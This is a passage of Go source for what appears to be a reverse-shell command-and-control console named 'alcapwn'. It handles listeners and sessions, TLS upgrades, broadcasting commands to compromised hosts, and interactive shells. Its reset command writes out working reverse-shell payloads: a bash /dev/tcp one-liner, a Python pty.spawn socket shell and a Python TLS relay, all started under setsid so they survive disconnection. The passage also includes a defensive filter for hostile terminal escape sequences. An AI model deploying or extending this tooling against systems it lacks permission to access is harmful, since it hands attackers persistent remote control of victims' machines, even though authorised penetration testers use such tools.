	c.pendingTLSUpgrade[origIP] = upgradeCh
	c.pendingTLSMu.Unlock()

	if writeErr := upgrader.write(reconnectCmd + "\n"); writeErr != nil {
		c.pendingTLSMu.Lock()
		delete(c.pendingTLSUpgrade, origIP)
		c.pendingTLSMu.Unlock()
		fmt.Printf("[!] Failed to send command to session %d: %v\n", id, writeErr)
		return
	}

	if c.opts.verbosity >= 1 {
		fmt.Printf("[*] Waiting for TLS reconnect from %s (10s timeout)...\n", origIP)
	}

	// The rest runs in a goroutine so the operator prompt returns immediately.
	tlsCfg := c.opts.tlsCfg
	verbosity := c.opts.verbosity
	go func() {
		defer func() {
			c.pendingTLSMu.Lock()
			delete(c.pendingTLSUpgrade, origIP)
			c.pendingTLSMu.Unlock()
		}()

		var rawConn net.Conn
		select {
		case rawConn = <-upgradeCh:
		case <-time.After(10 * time.Second):
			if verbosity >= 1 {
				c.printer.Notify("[!] Session %d TLS upgrade failed — reconnect timed out.", id)
			} else {
				c.printer.Notify("[!] Session %d TLS upgrade failed.", id)
			}
			return
		}

		// Verify TLS ClientHello and complete handshake.
		buf := make([]byte, 1)
		rawConn.Read(buf) //nolint:errcheck
		if buf[0] != 0x16 {
			rawConn.Close()
			if verbosity >= 1 {
				c.printer.Notify("[!] Session %d TLS upgrade failed — unexpected byte 0x%02x (expected TLS ClientHello 0x16).", id, buf[0])
			} else {
				c.printer.Notify("[!] Session %d TLS upgrade failed.", id)
			}
			return
		}
		candidate := tls.Server(&prefixConn{Conn: rawConn, prefix: buf}, tlsCfg)
		if hsErr := candidate.Handshake(); hsErr != nil {
			candidate.Close()
			if verbosity >= 1 {
				c.printer.Notify("[!] Session %d TLS upgrade failed — handshake: %v", id, hsErr)
			} else {
				c.printer.Notify("[!] Session %d TLS upgrade failed.", id)
			}
			return
		}

		// Upgrade in-place — session keeps its ID, no new session is created.
		// Plain conn stays open (closing it sends SIGHUP to the remote pty.spawn).
		upgrader.switchConn(candidate)
		sess.mu.Lock()
		sess.ActiveConn = candidate
		sess.TLS = true
		sess.mu.Unlock()

		// Reinitialise terminal on the new bash spawned by the Python relay.
		// Without this the new shell has no TERM, wrong stty size, and no
		// readline line-editing — typing would appear to do nothing.
		reinitTerminal(upgrader)

		// Start a drain on the new TLS conn so remote output doesn't back up
		// while the session is backgrounded between now and the next 'use'.
		c.startDrain(sess, candidate)

		c.printer.Notify("[+] Session %d upgraded to TLS successfully.", id)
	}()
}

// cmdReset spawns a new reverse-shell connection from an existing session, then
// tears down the old one.  The spawned process runs under setsid so it lives in
// its own session and is not killed when the parent shell receives SIGHUP on
// connection close.  The new shell arrives via the normal acceptLoop → handleSession
// path, so it gets PTY upgrade, optional TLS, and recon automatically.
func (c *Console) cmdReset(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: reset <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	state := sess.State
	upgrader := sess.Upgrader
	listenerAddr := sess.ListenerAddr
	plainConn := sess.Conn
	activeConn := sess.ActiveConn
	if activeConn == nil {
		activeConn = plainConn
	}
	sess.mu.Unlock()

	if state == SessionStateInteractive {
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if state == SessionStateTerminated {
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}
	if upgrader == nil {
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}

	// Require an active listener so the new shell has somewhere to land.
	entry := c.listeners.findByPort(listenerAddr)
	if entry == nil {
		fmt.Printf("[!] Listener %s is no longer active — restart it with 'listen %s' and retry.\n",
			listenerAddr, listenerAddr)
		return
	}

	// Derive the local IP the target originally connected to.
	effectiveListenIP := strings.Trim(hostFromAddr(plainConn.LocalAddr()), "[]")
	if effectiveListenIP == "" {
		effectiveListenIP, _, _ = net.SplitHostPort(listenerAddr)
	}
	_, portStr, _ := net.SplitHostPort(listenerAddr)
	listenPort := 4444
	if p, convErr := strconv.Atoi(portStr); convErr == nil {
		listenPort = p
	}

	// setsid puts the new bash in its own session so it survives the parent
	// shell closing (no SIGHUP propagation).
	//
	// If TLS is enabled globally and Python was used for PTY upgrade,
	// use the Python TLS relay so the new connection arrives encrypted.
	// Cert verification is disabled via verify_mode=ssl.CERT_NONE.
	var reconnectCmd string
	if upgrader.UsedPython() && c.opts.tlsEnabled {
		// Python TLS relay — fingerprint-pinned, identical to handleSession and
		// cmdTLSUpgrade so all three TLS paths have the same MITM protection.
		reconnectCmd = fmt.Sprintf(
			`%s -c "import socket,ssl,os,pty,threading,hashlib,subprocess as sp;m,sv=pty.openpty();p=sp.Popen(['/bin/bash'],stdin=sv,stdout=sv,stderr=sv,start_new_session=True,close_fds=True,pass_fds=[m]);os.close(sv);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE;t=ctx.wrap_socket(socket.create_connection(('%s',%d),timeout=10));assert hashlib.sha256(t.getpeercert(binary_form=True)).hexdigest()=='%s';exec('def rd():\n try:\n  while 1:\n   d=t.read(4096)\n   if d:os.write(m,d)\n   else:break\n except:pass\nthreading.Thread(target=rd,daemon=True).start()\ntry:\n while 1:\n  d=os.read(m,4096)\n  t.write(d)\nexcept:pass')"`,
			upgrader.PythonBin(), effectiveListenIP, listenPort, c.opts.fingerprintHex,
		)
	} else {
		// Fallback: plain /dev/tcp or python socket
		reconnectCmd = fmt.Sprintf(
			`(setsid bash -i >& /dev/tcp/%s/%d 0>&1 2>&1 &) 2>/dev/null || `+
				`(setsid python3 -c 'import socket,os,pty;s=socket.socket();`+
				`s.connect(("%s",%d));[os.dup2(s.fileno(),f) for f in(0,1,2)];`+
				`pty.spawn("/bin/bash")' &) 2>/dev/null`,
			effectiveListenIP, listenPort,
			effectiveListenIP, listenPort,
		)
	}

	fmt.Printf("[*] Resetting session %d — spawning new shell to %s:%d...\n",
		id, effectiveListenIP, listenPort)

	if writeErr := upgrader.write(reconnectCmd + "\n"); writeErr != nil {
		fmt.Printf("[!] Failed to send reset command to session %d: %v\n", id, writeErr)
		return
	}

	// Give the spawned process a moment to connect before we close the parent.
	// After close + Remove, acceptLoop will see the new connection as a fresh session.
	time.Sleep(300 * time.Millisecond)

	// Close the old session without killRemoteProcessGroup: we don't want to
	// SIGKILL the newly spawned setsid'd process (different session but still
	// same UID — pkill -g $$ would not reach it, but be safe and skip it).
	if activeConn != nil {
		activeConn.Close()
	}
	if plainConn != nil && plainConn != activeConn {
		plainConn.Close()
	}
	c.registry.Remove(id)

	fmt.Printf("[*] Session %d closed. New session will appear automatically when the target reconnects.\n", id)
}

func (c *Console) cmdRename(args []string) {
	if len(args) < 2 {
		fmt.Println("[!] Usage: rename <id> <name>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	name := sanitizeLabel(args[1])
	if name == "" {
		fmt.Println("[!] Name must contain only letters, digits, '-', '_', or '.'")
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}
	sess.mu.Lock()
	sess.Label = name
	sess.mu.Unlock()
	fmt.Printf("[*] Session %d renamed to: %s\n", id, name)
}

func (c *Console) cmdFingerprint(args []string) {
	if c.opts.fingerprint == "" {
		fmt.Println("[!] No TLS certificate configured. Use --tls at startup or 'tls <id>' to generate one.")
		return
	}
	if len(args) == 0 {
		fmt.Printf("[*] TLS certificate fingerprint:\n    %s\n", c.opts.fingerprint)
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}
	sess.mu.Lock()
	isTLS := sess.TLS
	sess.mu.Unlock()
	if !isTLS {
		fmt.Printf("[!] Session %d is not TLS-encrypted.\n", id)
		return
	}
	fmt.Printf("[*] Session %d TLS certificate fingerprint:\n    %s\n", id, c.opts.fingerprint)
}

func (c *Console) cmdHelp() {
	fmt.Println(`
  LISTENERS
    listen <host:port>       Start a new TCP listener
    listeners                List active listeners
    unlisten <port|addr>     Stop a listener

  SESSIONS
    sessions                 List all active sessions
    use <id>                 Attach to a session interactively (Ctrl+D to background)
    kill <id>                Terminate a session
    rename <id> <name>       Label a session (letters, digits, - _ . only)
    tls <id>                 Upgrade a plain session to TLS encryption
    fp [id]                  Show TLS certificate fingerprint (optionally confirm session)
    reset <id>               Spawn a new shell from session, close the old one
    info <id>                Print full recon summary for a session
    export <id> [path]       Save findings JSON to disk
    broadcast <cmd>          Send a command to all active sessions

  OPERATOR
    help                     Show this message
    exit                     Exit alcapwn (prompts if sessions are active)`)
}

// doExit handles the 'exit' command and clean shutdown.
// Returns true if the process should exit.
func (c *Console) doExit() bool {
	n := c.registry.Count()
	if n > 0 {
		noun := "sessions"
		if n == 1 {
			noun = "session"
		}
		fmt.Printf("[!] %d active %s will be terminated. Exit? [y/N] ", n, noun)
		reader := bufio.NewReader(os.Stdin)
		answer, _ := reader.ReadString('\n')
		answer = strings.TrimSpace(strings.ToLower(answer))
		if answer != "y" && answer != "yes" {
			return false
		}
	}
	c.cleanShutdown()
	return true
}

// cleanShutdown closes all listeners and terminates all sessions.
func (c *Console) cleanShutdown() {
	for _, e := range c.listeners.all() {
		e.ln.Close()
	}
	for _, s := range c.registry.All() {
		s.mu.Lock()
		conn := s.ActiveConn
		plain := s.Conn
		s.mu.Unlock()
		if conn != nil {
			conn.Close()
		}
		if plain != nil && plain != conn {
			plain.Close()
		}
		c.registry.Remove(s.ID)
	}
}

// ── Interactive session I/O ───────────────────────────────────────────────────

// interactiveFilter is a stateful streaming filter for the remote→stdout path
// of interactWithSession.  It preserves full terminal functionality — CSI
// sequences (colors, cursor movement, 'clear', readline, TUI apps) pass through
// unchanged — while stripping the specific sequences that pbsh weaponizes
// without any visible effect on the operator's screen:
//
//   • OSC 52 (\e]52;...BEL/ST)  — clipboard write hijack (pbsh "Sticky Fingers")
//   • APC   (\e_...\e\)          — arbitrary terminal control; one-time warning
//   • DCS   (\eP...\e\)          — device control string; no legitimate shell use
//   • PM    (\e^...\e\)          — privacy message; no legitimate shell use
//   • SOS   (\eX...\e\)          — start of string; no legitimate shell use
//
// Safe OSC sequences (e.g. terminal title \e]0;...) pass through unchanged.
// All other bytes — including CSI and charset designators — are forwarded as-is.
type interactiveFilter struct {
	state   ifState
	oscBuf  []byte // buffers \e] + up to 3 content bytes to detect OSC 52
	apcSeen bool   // true after the first APC — prevents repeat warnings
}

type ifState uint8

const (
	ifNormal       ifState = iota // regular passthrough
	ifEsc                         // just saw 0x1b
	ifOscPeek                     // buffering \e] + bytes to classify the OSC
	ifOscPass                     // safe OSC — emit content until BEL or ST
	ifOscPassEsc                  // in ifOscPass: saw 0x1b, waiting for '\'
	ifOscStrip                    // OSC 52 — discard until BEL or ST
	ifOscStripEsc                 // in ifOscStrip: saw 0x1b, waiting for '\'
	ifStrip                       // APC/DCS/PM/SOS — discard until ST (\e\)
	ifStripEsc                    // in ifStrip: saw 0x1b, waiting for '\'
)

// process filters p and returns bytes safe to write to the operator's terminal.
// apcDetected is true on the first call that encounters an APC sequence.
func (f *interactiveFilter) process(p []byte) (out []byte, apcDetected bool) {
	for _, b := range p {
		switch f.state {

		case ifNormal:
			if b == 0x1b {
				f.state = ifEsc
			} else {
				out = append(out, b)
			}

		case ifEsc:
			switch b {
			case 0x1b: // ESC ESC — emit first, stay in ifEsc for the second
				out = append(out, 0x1b)
			case ']': // OSC — peek at content to classify
				f.oscBuf = append(f.oscBuf[:0], 0x1b, ']')
				f.state = ifOscPeek
			case '_': // APC — warn once, strip
				if !f.apcSeen {
					apcDetected = true
					f.apcSeen = true
				}
				f.state = ifStrip
			case 'P', '^', 'X': // DCS, PM, SOS — strip
				f.state = ifStrip
			default: // CSI (\e[), charset designators (\e( \e)), etc. — pass through
				out = append(out, 0x1b, b)
				f.state = ifNormal
			}

		case ifOscPeek:
			// BEL before we have 3 content bytes — too short to be OSC 52, safe.
			if b == 0x07 {
				out = append(out, f.oscBuf...)
				out = append(out, b)
				f.oscBuf = f.oscBuf[:0]
				f.state = ifNormal
				continue
			}
			f.oscBuf = append(f.oscBuf, b)
			// Detect ST (\e\) as an early terminator.
			n := len(f.oscBuf)
			if n >= 2 && f.oscBuf[n-2] == 0x1b && b == '\\' {
				out = append(out, f.oscBuf...)
				f.oscBuf = f.oscBuf[:0]
				f.state = ifNormal
				continue
			}
			// oscBuf layout: [0x1b, ']', c0, c1, c2, ...]
			// Need 3 content bytes (indices 2,3,4) to distinguish OSC 52.
			if n >= 5 {
				if f.oscBuf[2] == '5' && f.oscBuf[3] == '2' && f.oscBuf[4] == ';' {
					// OSC 52 clipboard hijack — discard everything accumulated so far.
					f.oscBuf = f.oscBuf[:0]
					f.state = ifOscStrip
				} else {
					// Safe OSC — emit buffered bytes and continue passing.
					out = append(out, f.oscBuf...)
					f.oscBuf = f.oscBuf[:0]
					f.state = ifOscPass
				}
			}

		case ifOscPass:
			if b == 0x07 {
				out = append(out, b)
				f.state = ifNormal
			} else if b == 0x1b {
				f.state = ifOscPassEsc
			} else {
				out = append(out, b)
			}

		case ifOscPassEsc:
			out = append(out, 0x1b, b)
			if b == '\\' {
				f.state = ifNormal
			} else {
				f.state = ifOscPass
			}

		case ifOscStrip:
			if b == 0x07 {
				f.state = ifNormal
			} else if b == 0x1b {
				f.state = ifOscStripEsc
			}
			// else discard

		case ifOscStripEsc:
			if b == '\\' {
				f.state = ifNormal
			} else {
				f.state = ifOscStrip
			}

		case ifStrip:
			if b == 0x1b {
				f.state = ifStripEsc
			}
			// else discard

		case ifStripEsc:
			if b == '\\' {
				f.state = ifNormal
			} else {
				f.state = ifStrip
			}
		}
	}
	return
}

// startDrain launches a goroutine that reads and discards data from conn while
// the session is backgrounded.  Two purposes:
//  1. Prevents remote output from appearing on the operator's terminal.
//  2. Keeps the TCP receive window open so the remote shell never stalls on a
//     write and appears frozen.
//
// If the connection drops while backgrounded the session is removed from the
// registry and the operator is notified via printer.Notify.
func (c *Console) startDrain(sess *Session, conn net.Conn) {
	drainStop := make(chan struct{})
	drainDone := make(chan struct{})
	sess.mu.Lock()
	sess.drainStop = drainStop
	sess.drainDone = drainDone
	sess.drainConn = conn
	sess.mu.Unlock()

	go func() {
		defer close(drainDone)
		buf := make([]byte, 4096)
		for {
			conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond)) //nolint:errcheck
			_, err := conn.Read(buf)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					select {
					case <-drainStop:
						conn.SetReadDeadline(time.Time{}) //nolint:errcheck
						return
					default:
						continue
					}
				}
				// Real error — connection lost while backgrounded.
				conn.SetReadDeadline(time.Time{}) //nolint:errcheck
				sess.mu.Lock()
				plain := sess.Conn
				sess.mu.Unlock()
				if plain != nil && plain != conn {
					plain.Close()
				}
				conn.Close()
				c.registry.Remove(sess.ID)
				c.printer.Notify("[!] Session %d closed (connection lost)", sess.ID)
				return
			}
			conn.SetReadDeadline(time.Time{}) //nolint:errcheck
		}
	}()
}

// stopDrain stops a session's drain goroutine (if one is running) and blocks
// until it exits.  Must be called before starting interactive I/O so there is
// at most one reader on conn at any time.
//
// It interrupts the drain goroutine by setting a brief read deadline on
// sess.drainConn — the exact connection the drain is reading — rather than
// relying on the caller's conn.  This is critical for TLS-upgraded sessions
// where the drain may be on the plain conn but the caller only has the TLS conn.
func (c *Console) stopDrain(sess *Session) {
	sess.mu.Lock()
	drainStop := sess.drainStop
	drainDone := sess.drainDone
	drainConn := sess.drainConn
	sess.drainStop = nil
	sess.drainDone = nil
	sess.drainConn = nil
	sess.mu.Unlock()

	if drainStop == nil {
		return
	}
	close(drainStop)
	// Interrupt the drain goroutine's blocked Read on its own conn so it sees
	// drainStop on the next iteration rather than waiting up to 500 ms.
	if drainConn != nil {
		drainConn.SetReadDeadline(time.Now().Add(time.Millisecond)) //nolint:errcheck
	}
	<-drainDone
	if drainConn != nil {
		drainConn.SetReadDeadline(time.Time{}) //nolint:errcheck
	}
}

// stopRemoteGoroutine interrupts the remote→stdout goroutine that is running
// inside interactWithSession by setting a brief read deadline on conn, then
// waits for remoteDone to close.  Called on both background paths (Ctrl+D and
// external SIGINT) before handing the connection to startDrain, so the
// goroutine cannot write stale remote output to the operator's terminal.
func stopRemoteGoroutine(conn net.Conn, remoteDone <-chan struct{}) {
	conn.SetReadDeadline(time.Now().Add(time.Millisecond)) //nolint:errcheck
	select {
	case <-remoteDone:
	case <-time.After(100 * time.Millisecond): // safety valve; 1 ms deadline should always win
	}
	conn.SetReadDeadline(time.Time{}) //nolint:errcheck
}

// interactWithSession enters raw interactive mode with sess.
// Ctrl+D (0x04) backgrounds the session.  All other bytes — including
// Ctrl+C (0x03) — are forwarded to the remote shell unchanged.
// External SIGINT also triggers backgrounding via backgroundCh.
func (c *Console) interactWithSession(sess *Session) {
	sess.mu.Lock()
	conn := sess.ActiveConn
	if conn == nil {
		conn = sess.Conn
	}
	sess.mu.Unlock()

	// Stop any drain goroutine that was keeping the connection alive while
	// backgrounded — exactly one goroutine may read from conn at a time.
	c.stopDrain(sess)

	fd := int(os.Stdin.Fd())
	if !term.IsTerminal(fd) {
		fmt.Println("[!] stdin is not a TTY — interactive mode unavailable")
		sess.mu.Lock()
		sess.State = SessionStateActive
		sess.mu.Unlock()
		return
	}

	fmt.Printf("[*] Entering interactive mode with session %d (%s)\n", sess.ID, sess.RemoteAddr)
	fmt.Println("[*] Ctrl+D to background, Ctrl+C forwarded to remote")

	// TCP keepalive so silent drops are detected without a user keypress.
	if tc, ok := conn.(*net.TCPConn); ok {
		tc.SetKeepAlive(true)             //nolint:errcheck
		tc.SetKeepAlivePeriod(10 * time.Second) //nolint:errcheck
	}

	oldState, err := term.MakeRaw(fd)
	if err != nil {
		fmt.Printf("[!] Failed to enter raw mode: %v\n", err)
		sess.mu.Lock()
		sess.State = SessionStateActive
		sess.mu.Unlock()
		return
	}

	// Register background channel so SIGINT handler can trigger backgrounding.
	bgCh := make(chan struct{}, 1)
	c.state.mu.Lock()
	c.state.backgroundCh = bgCh
	c.state.mu.Unlock()

	// Forward SIGWINCH to remote shell.
	winchCh := make(chan os.Signal, 1)
	signal.Notify(winchCh, syscall.SIGWINCH)
	go func() {
		for range winchCh {
			cols, rows, winErr := term.GetSize(fd)
			if winErr == nil && cols > 0 && rows > 0 {
				conn.Write([]byte(fmt.Sprintf("stty columns %d rows %d\n", cols, rows))) //nolint:errcheck
			}
		}
	}()

	remoteDone := make(chan struct{})
	stdinDone := make(chan struct{})
	backgrounded := false

	// cancelCh is closed to signal the stdin goroutine to exit when the remote
	// disconnects (remoteDone) or the session is externally backgrounded (bgCh),
	// preventing it from blocking on the next os.Stdin.Read and consuming a
	// character from the operator prompt after interactWithSession returns.
	cancelCh := make(chan struct{})
	var cancelOnce sync.Once
	cancelStdin := func() { cancelOnce.Do(func() { close(cancelCh) }) }

	// Remote → stdout.  CSI (colors, cursor, clear, TUI apps) passes through
	// unchanged.  Dangerous sequences — OSC 52 (clipboard hijack), APC, DCS,
	// PM, SOS — are stripped by interactiveFilter.  Safe OSC (title etc.) also
	// passes through.  See interactiveFilter.process() for the full policy.
	go func() {
		defer close(remoteDone)
		flt := &interactiveFilter{}
		buf := make([]byte, 4096)
		for {
			n, readErr := conn.Read(buf)
			if n > 0 {
				safe, apcDetected := flt.process(buf[:n])
				if apcDetected {
					os.Stdout.Write([]byte("\r\n[!] APC sequence detected and stripped — possible TTY hijack attempt from " + sess.RemoteAddr + ".\r\n")) //nolint:errcheck
				}
				if len(safe) > 0 {
					os.Stdout.Write(safe) //nolint:errcheck
					os.Stdout.Sync()      //nolint:errcheck
				}
			}
			if readErr != nil {
				return
			}
		}
	}()

	// Stdin → remote.  0x04 = background; all other bytes including Ctrl+C
	// are forwarded so the remote shell handles them natively.
	// Uses unix.Select with a 50 ms timeout so cancelCh is checked between
	// polls — the goroutine exits within one poll cycle after cancelStdin()
	// is called, so it cannot consume console input after we return.
	go func() {
		defer close(stdinDone)
		buf := make([]byte, 1)
		for {
			// Poll stdin with a short timeout to allow clean cancellation.
			var rfds unix.FdSet
			rfds.Bits[fd>>6] |= int64(1) << (uint(fd) & 63)
			tv := unix.Timeval{Sec: 0, Usec: 50_000}
			n, err := unix.Select(fd+1, &rfds, nil, nil, &tv)
			if err != nil {
				// EINTR means a signal (e.g. SIGWINCH from terminal resize)
				// interrupted the syscall — restart rather than treating it
				// as a fatal error that would silently close the session.
				if err == syscall.EINTR {
					continue
				}
				return
			}
			if n == 0 {
				select {
				case <-cancelCh:
					return
				default:
					continue
				}
			}
			if _, readErr := os.Stdin.Read(buf); readErr != nil {
				return
			}
			if buf[0] == 0x04 { // Ctrl+D → background
				backgrounded = true
				return
			}
			// Forward everything else (including Ctrl+C) to the remote shell.
			if _, writeErr := conn.Write(buf); writeErr != nil {
				return
			}
		}
	}()

	select {
	case <-remoteDone:
		// Cancel the stdin goroutine and close conn so any in-flight write
		// fails immediately, then wait for it to exit before restoring the
		// terminal so it cannot consume characters from the operator prompt.
		cancelStdin()
		conn.Close()
		select {
		case <-stdinDone:
		case <-time.After(150 * time.Millisecond):
		}
		term.Restore(fd, oldState) //nolint:errcheck
		signal.Stop(winchCh)
		close(winchCh)
		c.state.mu.Lock()
		c.state.backgroundCh = nil
		c.state.mu.Unlock()

		fmt.Print("\r\n[*] Connection lost.\r\n")
		sess.mu.Lock()
		sess.State = SessionStateTerminated
		sess.mu.Unlock()
		c.registry.Remove(sess.ID)
		return

	case <-stdinDone:
		term.Restore(fd, oldState) //nolint:errcheck
		signal.Stop(winchCh)
		close(winchCh)
		c.state.mu.Lock()
		c.state.backgroundCh = nil
		c.state.mu.Unlock()

		if backgrounded {
			// Ctrl+D — keep session alive.  Stop the remote goroutine with a
			// brief deadline so it cannot write stale output after we return,
			// then hand the connection to a drain goroutine.
			stopRemoteGoroutine(conn, remoteDone)
			sess.mu.Lock()
			sess.State = SessionStateActive
			sess.mu.Unlock()
			c.startDrain(sess, conn)
			fmt.Printf("\r\n[*] Session [%d] backgrounded.\n", sess.ID)
		} else {
			// Write error or stdin EOF — remote likely gone.
			select {
			case <-remoteDone:
			case <-time.After(500 * time.Millisecond):
				conn.Close()
				<-remoteDone
			}
			killRemoteProcessGroup(conn)
			conn.Close()
			sess.mu.Lock()
			plain := sess.Conn
			sess.State = SessionStateTerminated
			sess.mu.Unlock()
			if plain != nil && plain != conn {
				plain.Close()
			}
			c.registry.Remove(sess.ID)
			fmt.Print("\r\n[*] Session closed.\r\n")
		}
		return

	case <-bgCh:
		// External SIGINT — background without closing.
		cancelStdin()
		select {
		case <-stdinDone:
		case <-time.After(150 * time.Millisecond):
		}
		term.Restore(fd, oldState) //nolint:errcheck
		signal.Stop(winchCh)
		close(winchCh)
		c.state.mu.Lock()
		c.state.backgroundCh = nil
		c.state.mu.Unlock()

		// Stop the remote goroutine then hand off to drain.
		stopRemoteGoroutine(conn, remoteDone)
		sess.mu.Lock()
		sess.State = SessionStateActive
		sess.mu.Unlock()
		c.startDrain(sess, conn)
		fmt.Printf("\r\n[*] Session [%d] backgrounded.\n", sess.ID)
	}
}

// ── Helpers ───────────────────────────────────────────────────────────────────

func fmtAge(d time.Duration) string {
	d = d.Round(time.Second)
	if d < time.Minute {
		return fmt.Sprintf("%ds", int(d.Seconds()))
	}
	if d < time.Hour {
		return fmt.Sprintf("%dm", int(d.Minutes()))
	}
	return fmt.Sprintf("%dh", int(d.Hours()))
}

